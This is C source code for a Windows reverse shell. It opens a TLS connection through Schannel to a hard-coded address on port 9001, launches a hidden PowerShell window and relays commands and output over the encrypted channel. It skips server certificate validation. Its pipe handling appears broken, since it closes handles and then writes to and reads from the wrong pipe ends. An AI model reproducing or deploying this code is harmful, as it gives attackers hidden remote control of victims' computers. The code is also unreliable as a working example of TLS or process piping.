#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include <schannel.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "shlwapi.lib")

#define IO_BUFFER_SIZE 0x10000

HMODULE g_hSecurity = NULL;
PSecurityFunctionTableA g_pSSPI = NULL;

// Load Secur32.dll and get the ANSI SSPI function table
DWORD LoadSecurityInterface(void) {
    INIT_SECURITY_INTERFACE_A pInit = NULL;
    g_hSecurity = LoadLibraryA("Secur32.dll");
    if (!g_hSecurity) return 0;
    pInit = (INIT_SECURITY_INTERFACE_A)
            GetProcAddress(g_hSecurity, "InitSecurityInterfaceA");
    if (!pInit) {
        FreeLibrary(g_hSecurity);
        return 0;
    }
    g_pSSPI = pInit();
    return (g_pSSPI != NULL);
}

// Build an Schannel credential for outbound TLS
DWORD TlsCreateCredentials(PCredHandle phCreds) {
    SCHANNEL_CRED cred;
    TimeStamp tsExpiry;
    ALG_ID algs[2] = { CALG_AES_256, CALG_3DES };

    ZeroMemory(&cred, sizeof(cred));
    cred.dwVersion = SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = SP_PROT_TLS1_2 | SP_PROT_TLS1_1 | SP_PROT_TLS1;
    cred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;
    cred.cSupportedAlgs = 2;
    cred.palgSupportedAlgs = algs;

    return
      (g_pSSPI->AcquireCredentialsHandleA(
          NULL,
          UNISP_NAME_A,
          SECPKG_CRED_OUTBOUND,
          NULL,
          &cred,
          NULL,
          NULL,
          phCreds,
          &tsExpiry
      ) == SEC_E_OK);
}

// Loop until client handshake completes or fails
SECURITY_STATUS ClientHandshakeLoop(
    SOCKET socket,
    PCredHandle phCreds,
    PCtxtHandle phContext,
    BOOL initialRead,
    PSecBuffer pExtraData
) {
    SecBufferDesc descIn, descOut;
    SecBuffer buffsIn[2], buffsOut[1];
    ULONG flags = ISC_REQ_SEQUENCE_DETECT
                | ISC_REQ_REPLAY_DETECT
                | ISC_REQ_CONFIDENTIALITY
                | ISC_RET_EXTENDED_ERROR
                | ISC_REQ_ALLOCATE_MEMORY
                | ISC_REQ_STREAM;
    ULONG outFlags = 0;
    SECURITY_STATUS status = SEC_I_CONTINUE_NEEDED;
    DWORD totalRecv = 0;
    BYTE *buffer = (BYTE*)malloc(IO_BUFFER_SIZE);
    if (!buffer) return SEC_E_INTERNAL_ERROR;

    BOOL doRead = initialRead;
    while (status == SEC_I_CONTINUE_NEEDED
        || status == SEC_E_INCOMPLETE_MESSAGE
        || status == SEC_I_INCOMPLETE_CREDENTIALS)
    {
        if (totalRecv == 0 || status == SEC_E_INCOMPLETE_MESSAGE) {
            if (doRead) {
                int r = recv(socket, (char*)buffer + totalRecv,
                             IO_BUFFER_SIZE - totalRecv, 0);
                if (r <= 0) { status = SEC_E_INTERNAL_ERROR; break; }
                totalRecv += r;
            } else {
                doRead = TRUE;
            }
        }

        buffsIn[0].pvBuffer   = buffer;
        buffsIn[0].cbBuffer   = totalRecv;
        buffsIn[0].BufferType = SECBUFFER_TOKEN;
        buffsIn[1].BufferType = SECBUFFER_EMPTY;

        descIn.ulVersion = SECBUFFER_VERSION;
        descIn.cBuffers  = 2;
        descIn.pBuffers  = buffsIn;

        buffsOut[0].pvBuffer   = NULL;
        buffsOut[0].cbBuffer   = 0;
        buffsOut[0].BufferType = SECBUFFER_TOKEN;

        descOut.ulVersion = SECBUFFER_VERSION;
        descOut.cBuffers  = 1;
        descOut.pBuffers  = buffsOut;

        status = g_pSSPI->InitializeSecurityContextA(
            phCreds,
            phContext,
            NULL,
            flags,
            0,
            SECURITY_NATIVE_DREP,
            &descIn,
            0,
            phContext,
            &descOut,
            &outFlags,
            NULL
        );

        // send token if generated
        if (buffsOut[0].pvBuffer && buffsOut[0].cbBuffer) {
            send(socket, buffsOut[0].pvBuffer, buffsOut[0].cbBuffer, 0);
            g_pSSPI->FreeContextBuffer(buffsOut[0].pvBuffer);
        }

        // handle extra bytes
        if (buffsIn[1].BufferType == SECBUFFER_EXTRA) {
            int extra = buffsIn[1].cbBuffer;
            memmove(buffer, buffer + totalRecv - extra, extra);
            totalRecv = extra;
        } else {
            totalRecv = 0;
        }

        if (status == SEC_E_OK) {
            if (pExtraData && buffsIn[1].BufferType == SECBUFFER_EXTRA) {
                pExtraData->pvBuffer = malloc(buffsIn[1].cbBuffer);
                pExtraData->cbBuffer = buffsIn[1].cbBuffer;
                pExtraData->BufferType = SECBUFFER_TOKEN;
                memcpy(pExtraData->pvBuffer,
                       buffer + (totalRecv - buffsIn[1].cbBuffer),
                       buffsIn[1].cbBuffer);
            }
            break;
        }

        if (status == SEC_E_INCOMPLETE_MESSAGE) {
            continue;
        }

        if (status == SEC_I_COMPLETE_AND_CONTINUE || status == SEC_I_COMPLETE_NEEDED)
        {
            g_pSSPI->CompleteAuthToken(phContext, &descOut);
        }

        if (FAILED(status)) {
            break;
        }
    }

    free(buffer);
    return status;
}

// Kick off the handshake by sending ClientHello
SECURITY_STATUS TlsPerformClientHandshake(
    SOCKET socket,
    PCredHandle phCreds,
    const char *serverName,
    PCtxtHandle phContext,
    PSecBuffer pExtraData
) {
    SecBufferDesc desc;
    SecBuffer buff;
    ULONG flags = ISC_REQ_SEQUENCE_DETECT
                | ISC_REQ_REPLAY_DETECT
                | ISC_REQ_CONFIDENTIALITY
                | ISC_RET_EXTENDED_ERROR
                | ISC_REQ_ALLOCATE_MEMORY
                | ISC_REQ_STREAM;
    ULONG outFlags = 0;

    buff.BufferType = SECBUFFER_TOKEN;
    buff.cbBuffer   = 0;
    buff.pvBuffer   = NULL;

    desc.ulVersion = SECBUFFER_VERSION;
    desc.cBuffers  = 1;
    desc.pBuffers  = &buff;

    SECURITY_STATUS status = g_pSSPI->InitializeSecurityContextA(
        phCreds,
        NULL,
        (SEC_CHAR*)serverName,
        flags,
        0,
        SECURITY_NATIVE_DREP,
        NULL,
        0,
        phContext,
        &desc,
        &outFlags,
        NULL
    );
    /*if (status != SEC_I_CONTINUE_NEEDED) {
        return status;
    }*/

    if (buff.pvBuffer && buff.cbBuffer) {
        send(socket, buff.pvBuffer, buff.cbBuffer, 0);
        g_pSSPI->FreeContextBuffer(buff.pvBuffer);
    }

    return ClientHandshakeLoop(socket, phCreds, phContext, TRUE, pExtraData);
}

// EncryptMessage wrapper
DWORD TlsSend(
    SOCKET socket,
    PCredHandle phCreds,
    CtxtHandle *phContext,
    PBYTE buffer,
    DWORD length
) {
    SecPkgContext_StreamSizes sizes;
    if (g_pSSPI->QueryContextAttributesA(
          phContext,
          SECPKG_ATTR_STREAM_SIZES,
          &sizes
        ) != SEC_E_OK) return 0;

    DWORD total = sizes.cbHeader + length + sizes.cbTrailer;
    BYTE *outbuf = malloc(total);
    memcpy(outbuf + sizes.cbHeader, buffer, length);

    SecBuffer buffs[3] = {
        { SECBUFFER_STREAM_HEADER,  sizes.cbHeader, outbuf },
        { SECBUFFER_DATA,           length,        outbuf + sizes.cbHeader },
        { SECBUFFER_STREAM_TRAILER, sizes.cbTrailer, outbuf + sizes.cbHeader + length }
    };
    SecBufferDesc desc = { SECBUFFER_VERSION, 3, buffs };

    if (g_pSSPI->EncryptMessage(phContext, 0, &desc, 0) != SEC_E_OK) {
        free(outbuf);
        return 0;
    }

    int sent = send(socket, outbuf,
                    buffs[0].cbBuffer + buffs[1].cbBuffer + buffs[2].cbBuffer,
                    0);
    free(outbuf);
    return (sent > 0 ? length : 0);
}

// DecryptMessage wrapper
DWORD TlsRecv(
    SOCKET      socket,
    PCredHandle phCreds,
    CtxtHandle *phContext,
    PBYTE       buffer,
    DWORD       size
) {
    printf("[TlsRecv] === ENTER ===\n");
    printf("[TlsRecv] socket=%u, phCreds=%p, phContext=%p, requested_size=%u\n",
           (unsigned)socket, (void*)phCreds, (void*)phContext, size);

    // 1) Query stream sizes
    SecPkgContext_StreamSizes sizes;
    printf("[TlsRecv] -> QueryContextAttributesA(..., STREAM_SIZES)\n");
    SECURITY_STATUS qca = g_pSSPI->QueryContextAttributesA(
        phContext,
        SECPKG_ATTR_STREAM_SIZES,
        &sizes
    );
    printf("[TlsRecv]    QCA return=0x%08X\n", qca);
    if (qca != SEC_E_OK) {
        DWORD err = GetLastError();
        printf("[TlsRecv]    ERROR: QCA failed, GetLastError()=%u\n", err);
        printf("[TlsRecv] === EXIT (0) ===\n\n");
        return 0;
    }
    printf("[TlsRecv]    header=%u, trailer=%u, max_msg=%u\n",
           sizes.cbHeader, sizes.cbTrailer, sizes.cbMaximumMessage);

    // 2) Allocate buffer for incoming TLS record
    DWORD maxRec = sizes.cbHeader + size + sizes.cbTrailer;
    printf("[TlsRecv] -> malloc(%u)\n", maxRec);
    BYTE *encbuf = (BYTE*)malloc(maxRec);
    if (!encbuf) {
        printf("[TlsRecv]    ERROR: malloc failed\n");
        printf("[TlsRecv] === EXIT (0) ===\n\n");
        return 0;
    }
    printf("[TlsRecv]    encbuf=%p\n", (void*)encbuf);

    // 3) recv raw TLS record
    printf("[TlsRecv] -> recv(socket, %u bytes)\n", maxRec);
    int recvd = recv(socket, (char*)encbuf, maxRec, 0);
    if (recvd < 0) {
        int serr = WSAGetLastError();
        printf("[TlsRecv]    ERROR: recv() failed, WSAGetLastError()=%d\n", serr);
        free(encbuf);
        printf("[TlsRecv] === EXIT (0) ===\n\n");
        return 0;
    } else if (recvd == 0) {
        printf("[TlsRecv]    peer closed connection\n");
        free(encbuf);
        printf("[TlsRecv] === EXIT (0) ===\n\n");
        return 0;
    }
    printf("[TlsRecv]    recv returned %d bytes\n", recvd);

    // 4) Prepare SECBUFFER_STREAM
    SecBuffer inBuf;
    inBuf.BufferType = SECBUFFER_STREAM;
    inBuf.cbBuffer   = (ULONG)recvd;
    inBuf.pvBuffer   = encbuf;
    SecBufferDesc desc = { SECBUFFER_VERSION, 1, &inBuf };
    printf("[TlsRecv] -> DecryptMessage with SECBUFFER_STREAM\n");

    // 5) DecryptMessage
    SECURITY_STATUS dm = g_pSSPI->DecryptMessage(phContext, &desc, 0, NULL);
    printf("[TlsRecv]    DecryptMessage return=0x%08X\n", dm);
    if (dm != SEC_E_OK && dm != SEC_I_RENEGOTIATE) {
        DWORD err = GetLastError();
        printf("[TlsRecv]    ERROR: DecryptMessage failed, GetLastError()=%u\n", err);
        free(encbuf);
        printf("[TlsRecv] === EXIT (0) ===\n\n");
        return 0;
    }

    // 6) Extract plaintext
    DWORD outLen = 0;
    if (inBuf.BufferType == SECBUFFER_DATA) {
        outLen = inBuf.cbBuffer;
        printf("[TlsRecv]    plaintext len=%u, pvBuffer=%p\n",
               outLen, inBuf.pvBuffer);
        memcpy(buffer, inBuf.pvBuffer, outLen);
    } else if (inBuf.BufferType == SECBUFFER_EXTRA) {
        // extra data case (multiple records)
        outLen = inBuf.cbBuffer;
        printf("[TlsRecv]    EXTRA plaintext len=%u\n", outLen);
        memcpy(buffer, inBuf.pvBuffer, outLen);
    } else {
        printf("[TlsRecv]    WARNING: unexpected BufferType=%u\n",
               inBuf.BufferType);
    }

    // 7) Cleanup & return
    free(encbuf);
    printf("[TlsRecv] === EXIT (%u) ===\n\n", outLen);
    return outLen;
}


// Send TLS close‑notify and clean up
DWORD TlsClose(SOCKET socket, PCtxtHandle phContext) {
    DWORD type = SCHANNEL_SHUTDOWN;
    SecBuffer buff = { SECBUFFER_TOKEN, sizeof(type), &type };
    SecBufferDesc desc = { SECBUFFER_VERSION, 1, &buff };

    g_pSSPI->ApplyControlToken(phContext, &desc);

    buff.pvBuffer   = NULL;
    buff.cbBuffer   = 0;
    buff.BufferType = SECBUFFER_TOKEN;

    ULONG flags = ISC_REQ_SEQUENCE_DETECT
                | ISC_REQ_REPLAY_DETECT
                | ISC_REQ_CONFIDENTIALITY
                | ISC_RET_EXTENDED_ERROR
                | ISC_REQ_ALLOCATE_MEMORY
                | ISC_REQ_STREAM;

    g_pSSPI->InitializeSecurityContextA(
        NULL,
        phContext,
        NULL,
        flags,
        0,
        SECURITY_NATIVE_DREP,
        &desc,
        0,
        phContext,
        &desc,
        &flags,
        NULL
    );
    if (buff.pvBuffer && buff.cbBuffer) {
        send(socket, buff.pvBuffer, buff.cbBuffer, 0);
        g_pSSPI->FreeContextBuffer(buff.pvBuffer);
    }

    closesocket(socket);
    g_pSSPI->DeleteSecurityContext(phContext);
    FreeLibrary(g_hSecurity);
    WSACleanup();
    return 1;
}

//----------------------------------------------------------------------------//
// Main: connect, handshake, spawn PowerShell, pump via TlsSend/TlsRecv
//----------------------------------------------------------------------------//
int main(void) {
    if (!LoadSecurityInterface()) {
        fprintf(stderr, "Failed to load SSPI\n");
        return 1;
    }

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = { 0 };
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(9001);
    sa.sin_addr.s_addr = inet_addr("192.168.2.228");

    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        perror("connect");
        return 1;
    }

    CredHandle cred;
    if (!TlsCreateCredentials(&cred)) {
        fprintf(stderr, "TlsCreateCredentials failed\n");
        return 1;
    }

    CtxtHandle ctx;
    SecBuffer extra = {0};
    if (TlsPerformClientHandshake(
            sock,
            &cred,
            "192.168.2.228",
            &ctx,
            &extra
        ) != SEC_E_OK)
    {
        fprintf(stderr, "Handshake failed\n");
        return 1;
    }

    // Spawn hidden PowerShell
    SECURITY_ATTRIBUTES saAttr = { sizeof(saAttr), NULL, TRUE };
    HANDLE inRd,inWr,outRd,outWr;
    CreatePipe(&outRd,&outWr,&saAttr,0);
    CreatePipe(&inRd,&inWr,&saAttr,0);
    SetHandleInformation(outWr, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(inRd,  HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags      = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput    = outRd;
    si.hStdOutput   = inWr;
    si.hStdError    = inWr;
    si.wShowWindow  = SW_HIDE;

    CreateProcessA(
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "-NoProfile -WindowStyle Hidden -Command -",
        NULL, NULL, TRUE,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );
    printf("CREATED POWERSHELL PROCESS\n");
    CloseHandle(outRd);
    CloseHandle(inWr);

    // Tunnel loop
    #define BUFSZ 4096
    printf("ENTERING TUNNEL LOOP\n");
    for (;;) {
        BYTE buf[BUFSZ];
        printf("ABOUT TO RUN TLSRECV\n");
        DWORD got = TlsRecv(sock, &cred, &ctx, buf, BUFSZ);
        printf("GOT PAST RECV GOT %d\n", got);
        if (got == 0) {
            continue;
        }

        DWORD written;
        WriteFile(inWr, buf, got, &written, NULL);

        DWORD avail;
        if (PeekNamedPipe(outRd, NULL,0,NULL,&avail,NULL) && avail) {
            BYTE tmp[BUFSZ];
            ReadFile(outRd, tmp, min(avail,BUFSZ), &written, NULL);
            TlsSend(sock, &cred, &ctx, tmp, written);
        }
        //Sleep(10);
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(inWr);
    CloseHandle(outRd);

    TlsClose(sock, &ctx);
    return 0;
}
